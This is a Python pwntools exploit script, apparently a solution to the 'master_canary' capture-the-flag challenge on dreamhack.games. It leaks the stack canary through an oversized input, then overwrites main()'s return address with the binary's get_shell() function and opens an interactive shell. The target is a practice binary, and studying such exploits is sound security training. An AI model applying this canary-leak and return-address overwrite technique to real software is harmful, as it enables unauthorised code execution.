from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/master_canary')
else:
    r = remote('host1.dreamhack.games', 15807)

sla = r.sendlineafter
sa = r.sendafter

get_shell = 0x400a4a  # get_shell()


# leak canary

sla('> ', '1')

sla('> ', '2')
size = 0x8e9
sla('Size: ', str(size))
sa('Data: ', 'a' * size)

r.recvuntil('a' * size)
canary = u64(r.recvn(7).rjust(8, b'\x00'))


# overwrite return address of main() with get_shell()

payload = b'a' * 0x28  # dummy
payload += p64(canary)  # canary
payload += b'a' * 8  # sfp
payload += p64(get_shell)

sla('> ', '3')
sa('Leave comment: ', payload)


r.interactive()